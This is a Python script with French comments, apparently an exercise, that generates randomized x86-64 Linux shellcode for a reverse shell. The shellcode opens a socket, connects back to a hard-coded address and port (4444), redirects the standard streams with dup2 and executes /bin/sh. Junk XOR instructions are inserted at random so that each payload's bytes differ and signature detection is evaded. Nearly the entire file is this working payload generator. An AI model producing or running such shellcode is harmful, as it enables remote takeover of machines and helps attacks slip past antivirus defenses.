#!/usr/bin/env python3
import random
from func_instu import *

port = 'x11\\x5c'
ip = 'x7f\\x01\\x01\\x01'

def partie0():
    part0 = [
        '\\x48\\x31\\xdb', # xor rbx, rbx
        '\\x48\\x31\\xc9', # xor rcx, rcx
        '\\x48\\x31\\xd2', # xor rdx, rdx
        '\\x48\\x31\\xff', # xor rdi, rdi
        '\\x48\\x31\\xf6'  # xor rsi, rsi
    ]

    # choix d'un chiffre aléatoire
    x = random.randint(0, 5)

    print(x)
    # pour que le shellcode soit fonctionnel il faut commencer par lui :
    resultat = ['\\x48\\x31\\xc0'] # xor rax, rax
    
    if x > 0:
        choix = random.sample(range(len(part0)), min(x, len(part0)))
        for index in choix:
            resultat.append(part0[index])
    
    # Concatenation
    resultat_concat = ''.join(resultat)

    return resultat_concat  

def partie1():

    # PARTIE : SOCKET

    
    moval = '\\xb0\\x29' # mov al, 41 
    movdil = '\\x40\\xb7\\x02' # mov dil, 2
    movsil = '\\x40\\xb6\\x01' # mov sil, 1
    movdl = '\\xb2\\x06' # mov dl, 6
    syscall = '\\x0f\\x05' # syscalls


    part1 = [
        '\\x50\\x41\\x58', # push rax, pop r8
        '\\x49\\x89\\xc0' # push r8, rax
    ]

    x = random.randint(0, 1)

    if x == 0 :
        choix = part1[0]
    elif x == 1 :
        choix = part1[1]
    
    resultat = moval + movdil + movsil + movdl + syscall + choix

    print(resultat)
    print("")

    return resultat    

def partie2(port, ip):

    subrsp = '\\x48\\x83\\xec\\x08' # sub rsp, 8
    movb = '\\xc6\\x04\\x24\\x02' # mov BYTE[rsp],0x2
    movw1 = f'\\x66\\xc7\\x44\\x24\\x02\\{port}' # mov WORD[rsp+0x2], {PORT HEXA Little IDIAN}
    movw2 = f'\\xc7\\x44\\x24\\x04\\{ip}'
    movrsi = '\\x48\\x89\\xe6' # mov rsi, rsp
    movdl = '\\xb2\\x10' # mov dl, 16
    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    moval = '\\xb0\\x2a' # mov al, 42
    syscall = '\\x0f\\x05' # syscall

    part2 = [
            '\\x48\\x31\\xdb', # xor rbx, rbx
            '\\x48\\x31\\xc9', # xor rcx, rcx
            '\\x48\\x31\\xd2', # xor rdx, rdx
            '\\x48\\x31\\xff', # xor rdi, rdi
            '\\x48\\x31\\xf6'  # xor rsi, rsi
    ]

       # choix d'un chiffre aléatoire entre 0 et 5
    x = random.randint(0, 5)

    print('part2 = ',x)

    resultat = []  # Initialise une liste vide pour stocker les instructions

    if x > 0:
        choix = random.sample(range(len(part2)), min(x, len(part2)))
        for index in choix:
            resultat.append(part2[index])

    # Concaténation de toutes les variables
    resultat_concat = ''.join(resultat) + subrsp + movb + movw1 + movw2 + movrsi + movdl + pushr8 + poprdi + moval + syscall

    print(resultat_concat)
    print("")
    
    return resultat_concat  


def partie3():

    x = random.randint(0, 1)

    if x == 0:
        resultat = movxl('al', 33)
    else :
        rdmxor = randomxor('al')
        moval = movxl('al', 33)
        resultat = rdmxor + moval

    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    xorrsi = '\\x48\\x31\\xf6' # xor rsi, rsi
    syscall = '\\x0f\\x05' # syscall

    resultat_concat = resultat + pushr8 + poprdi + xorrsi + syscall

    print("partie 3:", resultat_concat)
    print("")

    """
    operande fonctio* : 
    \xfe\xc0\x04\x20\x41\x50\x5f\x48\x31\xf6\x0f\x05
    \x30\xc0\xfe\xc0\x04\x20\x41\x50\x5f\x48\x31\xf6\x0f\x05
    \x30\xc0\x30\xc0\x04\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05
    \xb0\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05
    \x30\xc0\x04\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05
    """
    return resultat_concat

def partie4():

    x = random.randint(0, 1)

    if x == 0:
        resultat = movxl('al', 33)
    else :
        rdmxor = randomxor('al')
        moval = movxl('al', 33)
        resultat = rdmxor + moval

    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    movsil = '\\x40\\xb6\\x01' # mov sil, 1
    syscall = '\\x0f\\x05' # syscall

    resultat_concat = resultat + pushr8 + poprdi + movsil + syscall
    
    print("partie 4:", resultat_concat)
    print("")

    return resultat_concat

def partie5():

    x = random.randint(0, 1)

    if x == 0:
        resultat = movxl('al', 33)
    else :
        rdmxor = randomxor('al')
        moval = movxl('al', 33)
        resultat = rdmxor + moval

    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    movsil = '\\x40\\xb6\\x02' # mov sil, 2
    syscall = '\\x0f\\x05' # syscall

    resultat_concat = resultat + pushr8 + poprdi + movsil + syscall
    
    print("partie 5:", resultat_concat)
    print("")

    return resultat_concat

def partie6():
    part6 = [
        '\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05'
    ]

    """
    
    ; part 6
	xor rsi, rsi
	push rsi
	mov rdi, 0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	mov al, 59
	cdq
	syscall
    
    """

    print("Partie 6 : ",part6)
    print(" ")

    return part6

def choix(port, ip):

    result_part0 = partie0()
    result_part1 = partie1()  
    result_part2 = partie2(port, ip)  
    result_part3 = partie3()  
    result_part4 = partie4()
    result_part5 = partie5() 
    result_part6 = partie6()[0]  

    # Concatenation des résultats
    concatenated_result = result_part0 + result_part1 + result_part2 + result_part3 + result_part4 + result_part5 + result_part6

    print(concatenated_result)

choix(port, ip)
